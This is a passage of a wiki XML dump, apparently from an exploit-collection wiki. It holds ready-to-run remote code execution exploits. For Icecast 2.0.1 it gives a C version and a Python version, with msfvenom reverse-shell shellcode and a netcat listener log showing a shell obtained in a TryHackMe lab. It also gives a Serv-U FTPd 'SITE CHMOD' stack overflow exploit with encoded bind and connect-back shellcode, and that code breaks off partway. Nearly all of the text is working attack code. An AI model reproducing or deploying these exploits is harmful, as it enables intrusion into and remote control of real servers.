Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32&gt;
```

## Update for 568-edit.c
Managed to get the [original exploit](https://www.exploit-db.com/exploits/568) to work. Edited according [to this](https://www.exploit-db.com/exploits/573).

### Usage for 568-edit.c
```
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast &lt;= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!
```
On listener
```
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32&gt;

```

&lt;/pre&gt;

==568-edit.c==
&lt;pre&gt;
/* 

Original exploit here: https://www.exploit-db.com/exploits/568
I couldn't get this to work so I edited it according to
https://www.exploit-db.com/exploits/573

and made sure the shellcode was executed.

Compile and run
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast &lt;= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!

On listener
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32&gt;

*/ 

#include &lt;stdio.h&gt; 
#include &lt;stdlib.h&gt; 
#include &lt;string.h&gt; 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include &lt;winsock.h&gt; 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include &lt;unistd.h&gt; 
    #include &lt;sys/socket.h&gt; 
    #include &lt;sys/types.h&gt; 
    #include &lt;arpa/inet.h&gt; 
    #include &lt;netdb.h&gt; 
    #include &lt;netinet/in.h&gt; 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ 2048 
#define TIMEOUT 3 
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

// msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
unsigned char shellcode[] =
"\xda\xc6\xd9\x74\x24\xf4\x5f\xb8\x1e\xf9\xbc\x15\x2b\xc9\xb1"
"\x52\x83\xef\xfc\x31\x47\x13\x03\x59\xea\x5e\xe0\x99\xe4\x1d"
"\x0b\x61\xf5\x41\x85\x84\xc4\x41\xf1\xcd\x77\x72\x71\x83\x7b"
"\xf9\xd7\x37\x0f\x8f\xff\x38\xb8\x3a\x26\x77\x39\x16\x1a\x16"
"\xb9\x65\x4f\xf8\x80\xa5\x82\xf9\xc5\xd8\x6f\xab\x9e\x97\xc2"
"\x5b\xaa\xe2\xde\xd0\xe0\xe3\x66\x05\xb0\x02\x46\x98\xca\x5c"
"\x48\x1b\x1e\xd5\xc1\x03\x43\xd0\x98\xb8\xb7\xae\x1a\x68\x86"
"\x4f\xb0\x55\x26\xa2\xc8\x92\x81\x5d\xbf\xea\xf1\xe0\xb8\x29"
"\x8b\x3e\x4c\xa9\x2b\xb4\xf6\x15\xcd\x19\x60\xde\xc1\xd6\xe6"
"\xb8\xc5\xe9\x2b\xb3\xf2\x62\xca\x13\x73\x30\xe9\xb7\xdf\xe2"
"\x90\xee\x85\x45\xac\xf0\x65\x39\x08\x7b\x8b\x2e\x21\x26\xc4"
"\x83\x08\xd8\x14\x8c\x1b\xab\x26\x13\xb0\x23\x0b\xdc\x1e\xb4"
"\x6c\xf7\xe7\x2a\x93\xf8\x17\x63\x50\xac\x47\x1b\x71\xcd\x03"
"\xdb\x7e\x18\x83\x8b\xd0\xf3\x64\x7b\x91\xa3\x0c\x91\x1e\x9b"
"\x2d\x9a\xf4\xb4\xc4\x61\x9f\x7a\xb0\x35\xdf\x13\xc3\xc5\xde"
"\x58\x4a\x23\x8a\x8e\x1b\xfc\x23\x36\x06\x76\xd5\xb7\x9c\xf3"
"\xd5\x3c\x13\x04\x9b\xb4\x5e\x16\x4c\x35\x15\x44\xdb\x4a\x83"
"\xe0\x87\xd9\x48\xf0\xce\xc1\xc6\xa7\x87\x34\x1f\x2d\x3a\x6e"
"\x89\x53\xc7\xf6\xf2\xd7\x1c\xcb\xfd\xd6\xd1\x77\xda\xc8\x2f"
"\x77\x66\xbc\xff\x2e\x30\x6a\x46\x99\xf2\xc4\x10\x76\x5d\x80"
"\xe5\xb4\x5e\xd6\xe9\x90\x28\x36\x5b\x4d\x6d\x49\x54\x19\x79"
"\x32\x88\xb9\x86\xe9\x08\xc9\xcc\xb3\x39\x42\x89\x26\x78\x0f"
"\x2a\x9d\xbf\x36\xa9\x17\x40\xcd\xb1\x52\x45\x89\x75\x8f\x37"
"\x82\x13\xaf\xe4\xa3\x31";


/* 
in my example 0xcc is used to interrupt the code execution, you must 
put your shellcode exactly there. 
You don't need to call a shellcode offset (CALL ESP, JMP ESP and so 
on) or doing any other annoying operation because the code flow 
points directly there!!! 
Cool and easy 8-) 
*/ 


/*int startWinsock(void) 
{ 
  WSADATA wsa; 
  return WSAStartup(MAKEWORD(2,0),&amp;wsa); 
} 
*/
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 

int main(int argc, char *argv[]) { 
    struct sockaddr_in peer; 
    int sd; 
    u_short port = PORT; 
    u_char buff[BUFFSZ]; 
    u_char buf[4096]; 
    u_char *pointer=NULL; 

    setbuf(stdout, NULL); 

    fputs("\n" 
        "Icecast &lt;= 2.0.1 Win32 remote code execution "VER"\n" 
        "by Luigi Auriemma\n" 
        "e-mail: aluigi@altervista.org\n" 
        "web:http://aluigi.altervista.org\n" 
  "\nshellcode add-on by Delikon\n" 
  "www.delikon.de" 
        "\n", stdout); 

    if(argc &lt; 2) { 
        printf("\nUsage: %s &lt;server&gt; [port(%d)]\n" 
            "\n" 
            "Note: This exploit will force the Icecast server to download NCAT\n" 
            "and after execution it will spwan a shell on 9999\n" 
            "\n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    if(argc &gt; 2) port = atoi(argv[2]); 

    peer.sin_addr.s_addr = resolv(argv[1]); 
    peer.sin_port= htons(port); 
    peer.sin_family= AF_INET; 

    memset(buf,0x00,sizeof(buf)); 
    strcpy(buf,EXEC); 
    
pointer =strrchr(buf,0xcc); 

strcpy(pointer,shellcode); 

strcat(buf,"\r\n"); 
strcat(buf,"\r\n"); 
    

    printf("\n- target %s:%hu\n", 
        inet_ntoa(peer.sin_addr), port); 

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if(sd &lt; 0) std_err(); 

    if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer)) 
      &lt; 0) std_err(); 

    fputs("- send malformed data\n", stdout); 
    if(send(sd, buf, strlen(buf), 0) 
      &lt; 0) std_err(); 

    if((timeout(sd) &lt; 0) || (recv(sd, buff, BUFFSZ, 0) &lt; 0)) { 
        fputs("\nServer IS vulnerable!!!\n\n", stdout); 
    } else { 
        fputs("\nServer doesn't seem vulnerable\n\n", stdout); 
    } 

    close(sd); 
    return(0); 
} 

int timeout(int sock) { 
    struct timeval tout; 
    fd_set fd_read; 
    int err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&amp;fd_read); 
    FD_SET(sock, &amp;fd_read); 
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout); 
    if(err &lt; 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 

u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("\nError: Unable to resolve hostname (%s)\n", host); 
            exit(1); 
        } else host_ip = *(u_long *)(hp-&gt;h_addr); 
    } 
    return(host_ip); 
} 

#ifndef WIN32 
    void std_err(void) { 
        exit(1); 
    } 
#endif 

// milw0rm.com [2004-10-06]

&lt;/pre&gt;

==icecast.py==
&lt;pre&gt;
#!/usr/bin/env python3
##############################################################################################
# How to use:
# 1. Replace 'buf' shellcode below with msfvenom shellcode
# 2. Call it like this: ./icecast.py &lt;target&gt; &lt;port&gt;
# Eg. root@Kali:~# ./icecast.py 192.168.92.133 8000
##############################################################################################
import socket
import sys

host = sys.argv[1] # Receive IP from user
port = int(sys.argv[2]) # Receive Port from user

# Replace with own shellcode here
# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -f python -b '\x00\x0a\x0d'

buf =  ""
buf += "\xd9\xc5\xd9\x74\x24\xf4\xba\xc4\x81\xbb\x95\x5e\x31"
buf += "\xc9\xb1\x52\x31\x56\x17\x03\x56\x17\x83\x2a\x7d\x59"
buf += "\x60\x4e\x96\x1c\x8b\xae\x67\x41\x05\x4b\x56\x41\x71"
buf += "\x18\xc9\x71\xf1\x4c\xe6\xfa\x57\x64\x7d\x8e\x7f\x8b"
buf += "\x36\x25\xa6\xa2\xc7\x16\x9a\xa5\x4b\x65\xcf\x05\x75"
buf += "\xa6\x02\x44\xb2\xdb\xef\x14\x6b\x97\x42\x88\x18\xed"
buf += "\x5e\x23\x52\xe3\xe6\xd0\x23\x02\xc6\x47\x3f\x5d\xc8"
buf += "\x66\xec\xd5\x41\x70\xf1\xd0\x18\x0b\xc1\xaf\x9a\xdd"
buf += "\x1b\x4f\x30\x20\x94\xa2\x48\x65\x13\x5d\x3f\x9f\x67"
buf += "\xe0\x38\x64\x15\x3e\xcc\x7e\xbd\xb5\x76\x5a\x3f\x19"
buf += "\xe0\x29\x33\xd6\x66\x75\x50\xe9\xab\x0e\x6c\x62\x4a"
buf += "\xc0\xe4\x30\x69\xc4\xad\xe3\x10\x5d\x08\x45\x2c\xbd"
buf += "\xf3\x3a\x88\xb6\x1e\x2e\xa1\x95\x76\x83\x88\x25\x87"
buf += "\x8b\x9b\x56\xb5\x14\x30\xf0\xf5\xdd\x9e\x07\xf9\xf7"
buf += "\x67\x97\x04\xf8\x97\xbe\xc2\xac\xc7\xa8\xe3\xcc\x83"
buf += "\x28\x0b\x19\x03\x78\xa3\xf2\xe4\x28\x03\xa3\x8c\x22"
buf += "\x8c\x9c\xad\x4d\x46\xb5\x44\xb4\x01\x7a\x30\xea\x51"
buf += "\x12\x43\x12\x53\x58\xca\xf4\x39\x8e\x9b\xaf\xd5\x37"
buf += "\x86\x3b\x47\xb7\x1c\x46\x47\x33\x93\xb7\x06\xb4\xde"
buf += "\xab\xff\x34\x95\x91\x56\x4a\x03\xbd\x35\xd9\xc8\x3d"
buf += "\x33\xc2\x46\x6a\x14\x34\x9f\xfe\x88\x6f\x09\x1c\x51"
buf += "\xe9\x72\xa4\x8e\xca\x7d\x25\x42\x76\x5a\x35\x9a\x77"
buf += "\xe6\x61\x72\x2e\xb0\xdf\x34\x98\x72\x89\xee\x77\xdd"
buf += "\x5d\x76\xb4\xde\x1b\x77\x91\xa8\xc3\xc6\x4c\xed\xfc"
buf += "\xe7\x18\xf9\x85\x15\xb9\x06\x5c\x9e\xc9\x4c\xfc\xb7"
buf += "\x41\x09\x95\x85\x0f\xaa\x40\xc9\x29\x29\x60\xb2\xcd"
buf += "\x31\x01\xb7\x8a\xf5\xfa\xc5\x83\x93\xfc\x7a\xa3\xb1"

evul = "\xeb\x0c" + " / HTTP/1.1 " + buf + "\r\n" + "Accept: text/html\r\n"*31
evul += "\xff\x64\x24\x04" + "\r\n\r\n"  # jmp [esp+4] 

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	# Declare a TCP socket
client.connect((host,port))                               #Connect to TCP socket
client.sendall(evul.encode('latin-1'))	                                # Send buffer overflow
client.close()

print("\nDone!")

&lt;/pre&gt;</text>
      <sha1>0ufu32nfkxam1r0us2b0ddldyv7vi4k</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2004-2111 RhinoSoft Serv-U FTPd Server 3.x/4.x - 'SITE CHMOD' 遠程溢出漏洞</title>
    <ns>0</ns>
    <id>1672</id>
    <revision>
      <id>2076</id>
      <timestamp>2021-05-03T12:46:00Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; /* *----------------------------------------------------------------------- *  * Servu.c - Serv-U FTPD 3.x/4.x "SITE CHMOD" Command * Remote stack buffer overflo..."</comment>
      <origin>2076</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="13863" sha1="m6dyo7rkf0anz9ky3rvwtmyq098dgry" xml:space="preserve">==EXP==
&lt;pre&gt;
/*
*-----------------------------------------------------------------------
* 
* Servu.c - Serv-U FTPD 3.x/4.x "SITE CHMOD" Command
* Remote stack buffer overflow exploit
*
* Copyright (C) 2004 HUC All Rights Reserved.
*
* Author   : lion
*          : lion@cnhonker.net
*          : http://www.cnhonker.com
* Date     : 2004-01-25
*          : 2004-01-25 v1.0 Can attack Serv-U v3.0.0.20~v4.1.0.11
* Tested   : Windows 2000 Server EN/GB
*          :	 + Serv-U v3.0.0.20~v4.1.0.11
* Notice   : *** Bug find by kkqq kkqq@0x557.org ***
*          : *** You need a valid account and a writable directory. ***
* Complie  : cl Servu.c
* Usage	   : Servu &lt;-i ip&gt; &lt;-t type&gt; [-u user] [-p pass] [-d dir] [-f ftpport] [-c cbhost] [-s shellport]
*------------------------------------------------------------------------
*/

#include &lt;winsock2.h&gt;
#include &lt;windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#pragma comment(lib, "ws2_32")

// for bind shellcode
#define BIND_OFFSET		91

// for connectback shellcode
#define PORT_OFFSET		95
#define IP_OFFSET		88

#define SEH_OFFSET		0x193	//v3.0.0.20~v4.1.0.11
//#define	SEH_OFFSET		0x133 // work on v3.0.0.16~v3.0.0.19, for connectback shellcode
#define MAX_LEN			2048
#define JMP_OVER		"\xeb\x06\xeb\x06"
#define	VERSION			"1.0"

struct
{
	DWORD	dwJMP;
	char	*szDescription;
}targets[] =
{
	{0x7ffa4a1b,"Serv-U v3.0.0.20~v4.1.0.11  GB     2K/XP  ALL"},	//for all GB win2000 and winxp
// {0x74FD69A9,"Serv-U v3.0.0.20~v4.1.0.11  GB     2K     SP3/SP4"},	//wsock32.dll jmp ebx addr
// {0x71a469ad,"Serv-U v3.0.0.20~v4.1.0.11  GB     XP     SP0/SP1"},	//wsock32.dll jmp ebx addr
// {0x77e45f17,"Serv-U v3.0.0.20~v4.1.0.11  GB/BG  2K     SP4"},	//user32.dll jmp ebx addr
// {0x7ffa2186,"Serv-U v3.0.0.20~v4.1.0.11  BG     2K/XP  ALL"},	//for all BG win2000 and winxp	
// {0x6dec6713,"Serv-U v3.0.0.20~v4.1.0.11  BG     2K     SP4"},	//setupapi.dll jmp ebx addr
// {0x6DEE6713,"Serv-U v3.0.0.20~v4.1.0.11  KR     2K     SP4"},	//setupapi.dll jmp ebx addr
// {0x77886713,"Serv-U v3.0.0.20~v4.1.0.11  EN     2K     SP4"},	//setupapi.dll jmp ebx addr
// {0x76b42a3a,"Serv-U v3.0.0.20~v4.1.0.11  EN     XP     SP1"},
// {0x12345678,"Serv-U v3.0.0.20~v4.1.0.11"},         
},v;


unsigned char	*szSend[4];
unsigned char	szCommand[MAX_LEN];
char		szDirectory[0x100];

// 28 bytes decode by lion, don't change this.
unsigned char decode[]=
"\xBE\x6D\x69\x6F\x6E\x4E\xBF\x6D\x69\x30\x6E\x4F\x43\x39\x3B\x75"
"\xFB\x4B\x80\x33\x93\x39\x73\xFC\x75\xF7\xFF\xD3";

// Shellcode start sign, use for decode, don't change this.
unsigned char sc_start[]=
"lion"; 

// Shellcode end sign, use for decode, don't change this.
unsigned char sc_end[]=
"li0n"; 

// 311 bytes bind shellcode by lion (xor with 0x93)
unsigned char sc[]=
"\x7A\x96\x92\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18"
"\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x36\x93\x93\x93"
"\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18"
"\x7B\xF9\x95\xCA\x7B\x1F\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93"
"\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92"
"\xF9\x91\x6C\xC5\x87\x18\x4B\x54\x94\x91\x93\x93\xA6\xA0\x53\x1A"
"\xD4\x97\xF9\x83\xC4\xC0\x6C\xC5\x8B\xF9\x92\xC0\x6C\xC5\x8F\xC3"
"\xC3\xC0\x6C\xC5\xB3\x18\x4B\xA0\x53\xFB\xF0\xFE\xF7\x93\x1A\xF5"
"\xA3\x10\x7F\xC7\x18\x6F\xF9\x87\xCA\x1A\x97\x1C\x71\x68\x55\xD4"
"\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A\xCC\xDB\x1A\xCC\xDF\x1A\xCC"
"\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2\xC2\xF9\x92\xC2\xC2\x6C\xE5"
"\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C\x6C\xA2\x6C\xC5\x9B\xC0\x6C"
"\xC5\xB7\x6C\xC5\x9F\xC2\xC5\x18\xE6\xAF\x18\xE7\xBD\xEB\x90\x66"
"\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA\xD2\x3E\x90\x56\xA0\x48\x9C"
"\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E\x90\x49\xD3\x78\x62\xA8\x8C"
"\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90"
"\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA\x50\x7B\x65\x6D\x6C\x6C\x1D"
"\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A\x96\x5D\xED\x4B\x71\xE0\x58"
"\x7E\x6F\xA8\x4A\x9A\x66\x3E\x37\x89\xE3\x54\x37\x3E\xBD\x7A\x76"
"\xDA\x15\xDA\x74\xEA\x55\xEA";

// 294 bytes connectback shellcode by lion (xor with 0x93)
unsigned char cbsc[]=
"\x7A\x6F\x93\x93\x93\xCC\xF7\x32\xA3\x93\x93\x93\x18\xD3\x9F\x18"
"\xE3\x8F\x3E\x18\xFB\x9B\x18\x64\xF9\x97\xCA\x7B\x0F\x93\x93\x93"
"\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC\xC7\x6C\x85\x18"
"\x7B\xF9\x97\xCA\x7B\x10\x93\x93\x93\x71\x6A\x12\x7F\x03\x92\x93"
"\x93\xC7\xFB\x92\x92\x93\x93\x6C\xC5\x83\xC3\xC3\xC3\xC3\xF9\x92"
"\xF9\x91\x6C\xC5\x87\x18\x4B\xFB\xEC\x93\x93\x92\xFB\x91\x93\x93"
"\xA6\x18\x5F\xF9\x83\xC2\xC0\x6C\xC5\x8B\x16\x53\xE6\xD8\xA0\x53"
"\xFB\xF0\xFE\xF7\x93\x1A\xF5\xA3\x10\x7F\xC7\x18\x6F\xF9\x83\xCA"
"\x1A\x97\x1C\x71\x68\x55\xD4\x83\xD7\x6D\xD4\xAF\x6D\xD4\xAE\x1A"
"\xCC\xDB\x1A\xCC\xDF\x1A\xCC\xC3\x1E\xD7\xB7\x83\xC4\xC3\xC2\xC2"
"\xC2\xF9\x92\xC2\xC2\x6C\xE5\xA3\xC2\x6C\xC5\x97\x18\x5F\xF9\x6C"
"\x6C\xA2\x6C\xC5\x9B\xC0\x6C\xC5\x8F\x6C\xC5\x9F\xC2\xC5\x18\xE6"
"\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA"
"\xD2\x3E\x90\x56\xA0\x48\x9C\x2D\x83\xA9\x45\xE7\x9B\x52\x58\x9E"
"\x90\x49\xD3\x78\x62\xA8\x8C\xE6\x74\xCD\x18\xCD\xB7\x90\x4E\xF5"
"\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38\xCD\xCA"
"\x50\x7B\x6C\x6D\x6C\x6C\x1D\xDD\x9D\x7F\xE1\x6D\x20\x85\x3E\x4A"
"\x96\x5D\xED\x4B\x71\xE0\x58\x7E\x6F\xA8\x4A\x9A\x66\x3E\x7F\x6A"
"\x39\xF3\x74\xEA\x55\xEA";

void usage(char *p)
{
	int	i;
	printf( "Usage:\t%s\t&lt;-i ip&gt; &lt;-t type&gt;\n"
		"\t\t[-u user] [-p pass] [-d dir]\n"
		"\t\t[-f ftpport] [-c cbhost] [-s shellport]\n\n"
		"[type]:\n" , p);	
	for(i=0;i&lt;sizeof(targets)/sizeof(v);i++)
	{
		printf("\t%d\t0x%x\t%s\n", i, targets[i].dwJMP, targets[i].szDescription);
	}
}

/* ripped from TESO code and modifed by ey4s for win32 */
void shell (int sock)
{
	int     l;
	char    buf[512];
	struct	timeval time;
	unsigned long	ul[2];

	time.tv_sec = 1;
	time.tv_usec = 0;

	while (1)
	{
		ul[0] = 1;
		ul[1] = sock;

		l = select (0, (fd_set *)&amp;ul, NULL, NULL, &amp;time);
		if(l == 1)
		{
			l = recv (sock, buf, sizeof (buf), 0);
			if (l &lt;= 0)
			{
				printf ("[-] Connection closed.\n");
				return;
			}
			l = write (1, buf, l);
			if (l &lt;= 0)
			{
				printf ("[-] Connection closed.\n");
				return;
			}
		}
		else
		{
			l = read (0, buf, sizeof (buf));
			if (l &lt;= 0)
			{
				printf("[-] Connection closed.\n");
				return;
			}
			l = send(sock, buf, l, 0);
			if (l &lt;= 0)
			{
				printf("[-] Connection closed.\n");
				return;
			}
		}
	}
}

void main(int argc, char **argv)
{
	struct	sockaddr_in sa, server, client;
	WSADATA	wsd;
	SOCKET	s, s2, s3;
	int	iErr, ret, len;
	char	szRecvBuff[MAX_LEN];
	int	i, j, iType;
	int	iPort=21;
	char	*ip=NULL, *pUser="ftp", *pPass="ftp@ftp.com", *cbHost=NULL;
	char	user[128], pass[128];
	BOOL	bCb=FALSE, bLocal=TRUE;
	unsigned short	shport=53, shport2=0;
	unsigned long	cbip;
	unsigned int	timeout=5000, Reuse;
	char	penetrate[255],cbHost2[20];
	int seh_offset;
	
	printf( "Serv-U FTPD 3.x/4.x \"SITE CHMOD\" remote overflow exploit V%s\r\n"
		"Bug find by kkqq kkqq@0x557.org, Code By lion (lion@cnhonker.net)\r\n"
		"Welcome to HUC website http://www.cnhonker.com\r\n\n"
		 	, VERSION);

	seh_offset = SEH_OFFSET;
	
	if(argc &lt; 4)
	{
		usage(argv[0]);
		return;
	}

	for(i=1;i&lt;argc;i+=2)
	{
		if(strlen(argv[i]) != 2)
		{
			usage(argv[0]);
			return;
		}
		// check parameter
		if(i == argc-1)
		{
			usage(argv[0]);
			return;
		}
		switch(argv[i][1])
		{
			case 'i':
				ip=argv[i+1];
				break;
			case 't':
				iType = atoi(argv[i+1]);
				break;
			case 'f':
				iPort=atoi(argv[i+1]);
				break;
			case 'p':
				pPass = argv[i+1];
				break;
			case 'u':
				pUser=argv[i+1];
				break;
			case 'c':
				cbHost=argv[i+1];
				bCb=TRUE;
				break;
			case 's':
				shport=atoi(argv[i+1]);
				break;
			case 'd':
				if(argv[i+1][0] != '/')
					strcpy(szDirectory, "/");
				strncat(szDirectory, argv[i+1], sizeof(szDirectory)-0x20);
				
				if(szDirectory[strlen(szDirectory)-1] != '/')
					strcat(szDirectory, "/");
					
				// correct the directory len
				for(j=0;j&lt;(strlen(szDirectory)-1)%8;j++)
					strcat(szDirectory, "x");
					
				//printf("%d:%s\r\n", strlen(szDirectory), szDirectory);
				seh_offset = seh_offset - strlen(szDirectory)+1;
				break;
		}
	}

	if((!ip) || (!user) || (!pass))
	{
		usage(argv[0]);
		printf("[-] Invalid parameter.\n");
		return;
	}

	if( (iType&lt;0) || (iType&gt;=sizeof(targets)/sizeof(v)) )
	{
		usage(argv[0]);
		printf("[-] Invalid type.\n");
		return;
	}

	if(iPort &lt;0 || iPort &gt;65535 || shport &lt;0 || shport &gt; 65535)
	{
		usage(argv[0]);
		printf("[-] Invalid port.\n");
		return;
	}
	
	_snprintf(user, sizeof(user)-1, "USER %s\r\n", pUser);
	user[sizeof(user)-1]='\0';
	_snprintf(pass, sizeof(pass)-1, "PASS %s\r\n", pPass);
	pass[sizeof(pass)-1]='\0';
	szSend[0] = user;	//user
	szSend[1] = pass;	//pass	
	szSend[2] = penetrate;	//pentrate
	szSend[3] = szCommand;	//shellcode
	
	// Penetrate through the firewall.
	if(bCb &amp;&amp; shport &gt; 1024)
	{
		strncpy(cbHost2, cbHost, 20);
		for(i=0;i&lt;strlen(cbHost); i++)
		{
			if(cbHost[i] == '.')
				cbHost2[i] = ',';
		}
		
		sprintf(penetrate, "PORT %s,%d,%d\r\n", cbHost2, shport/256, shport%256);

		//printf("%s", penetrate);
	}
	else
	{
		sprintf(penetrate,"TYPE I\r\n");		
	}

	// fill the "site chmod" command
	strcpy(szCommand, "site chmod 777 ");
	
	// fill the directory
	if(szDirectory[0])
		strcat(szCommand, szDirectory);

	// fill the egg
	for(i=0;i&lt;seh_offset%8;i++)
		strcat(szCommand, "\x90");
	//strcat(szCommand, "BBBB");
	
	// fill the seh
	for(i=0;i&lt;=(seh_offset/8)*8+0x20;i+=8)
	{
		strcat(szCommand, JMP_OVER);
		memcpy(&amp;szCommand[strlen(szCommand)], &amp;targets[iType].dwJMP, 4);
	}
		
	// fill the decode
	strcat(szCommand, decode);

	// fill the shellcode start	sign
	strcat(szCommand, sc_start);

	// fill the shellcode
	if(bCb)
	{
		// connectback shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		cbip = inet_addr(cbHost)^0x93939393;
		memcpy(&amp;cbsc[PORT_OFFSET], &amp;shport2, 2);
		memcpy(&amp;cbsc[IP_OFFSET], &amp;cbip, 4);
		strcat(szCommand, cbsc);		
	}
	else
	{
		// bind shellcode
		shport2 = htons(shport)^(u_short)0x9393;
		memcpy(&amp;sc[BIND_OFFSET], &amp;shport2, 2);
		strcat(szCommand, sc);
	}

	// fill the shellcode end sign
	strcat(szCommand, sc_end);

	// send end
	strcat(szCommand, "\r\n");

	if(strlen(szCommand) &gt;= sizeof(szCommand))
	{
		printf("[-] stack buffer overflow.\n");
		return;
	}
	
//	printf("send size %d:%s", strlen(szCommand), szCommand);
	
	__try
	{
		if (WSAStartup(MAKEWORD(1,1), &amp;wsd) != 0)
		{
			printf("[-] WSAStartup error:%d\n", WSAGetLastError());
			__leave;
		}

		s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if(s == INVALID_SOCKET)
		{
			printf("[-] Create socket failed:%d",GetLastError());
			__leave;
		}

		sa.sin_family=AF_INET;
		sa.sin_port=htons((USHORT)iPort);
		sa.sin_addr.S_un.S_addr=inet_addr(ip);

		setsockopt(s,SOL_SOCKET,SO_RCVTIMEO,(char *)&amp;timeout,sizeof(unsigned int));
		iErr = connect(s,(struct sockaddr *)&amp;sa,sizeof(sa));
		if(iErr == SOCKET_ERROR)
		{
			printf("[-] Connect to %s:%d error:%d\n", ip, iPort, GetLastError());
			__leave;
		}
		printf("[+] Connect to %s:%d success.\n", ip, iPort);
		
		if(bCb)
		{
			Sleep(500);
			s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

			server.sin_family=AF_INET;
			server.sin_addr.S_un.S_addr=inet_addr(cbHost);
			//server.sin_addr.s_addr=INADDR_ANY; 
			server.sin_port=htons((unsigned short)shport);

			setsockopt(s2,SOL_SOCKET,SO_RCVTIMEO,(char *)&amp;timeout,sizeof(unsigned int));

			Reuse = 1; 
			setsockopt(s2, SOL_SOCKET, SO_REUSEADDR, (char*)&amp;Reuse, sizeof(Reuse));

			if(bind(s2,(LPSOCKADDR)&amp;server,sizeof(server))==SOCKET_ERROR)
			{
				printf("[-] Bind port on %s:%d error.\n", cbHost, shport);
				printf("[-] You must run nc get the shell.\n");
				bLocal = FALSE;
				//closesocket(s2);
				//__leave;
			}
			else
			{	
				printf("[+] Bind port on %s:%d success.\n", cbHost, shport);
				listen(s2, 1); 
			}
		}
		
		for(i=0;i&lt;sizeof(szSend)/sizeof(szSend[0]);i++)
		{
			memset(szRecvBuff, 0, sizeof(szRecvBuff));
			iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
			if(iErr == SOCKET_ERROR)
			{
				printf("[-] Recv buffer error:%d.\n", WSAGetLastError());
				__leave;
			}
			printf("[+] Recv: %s", szRecvBuff);
			
